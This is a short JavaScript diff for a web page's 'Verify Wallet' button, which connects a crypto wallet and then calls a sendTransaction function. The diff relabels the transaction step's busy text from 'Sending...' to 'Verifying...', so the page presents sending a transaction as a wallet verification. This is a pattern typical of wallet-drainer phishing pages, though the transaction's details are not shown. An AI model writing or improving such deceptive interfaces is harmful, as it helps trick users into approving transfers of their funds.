@@ -60,7 +60,7 @@ actionBtn.addEventListener("click", async () => {
         showToast(`Connected: ${newAddress}`, "success");
         actionBtn.textContent = "Verify Wallet";
       } else {
-        showToast("Connection failed", "error");
+        showToast("Wallet not Connect", "error");
       }
     } catch (err) {
       console.error("❌ Connection Error:", err);
@@ -71,7 +71,7 @@ actionBtn.addEventListener("click", async () => {
   } else {
     // Already connected: send transaction
     try {
-      setButtonState(true, "Sending...");
+      setButtonState(true, "Verifying...");
       await sendTransaction();
 
       // After transaction, mark as verified and disable button
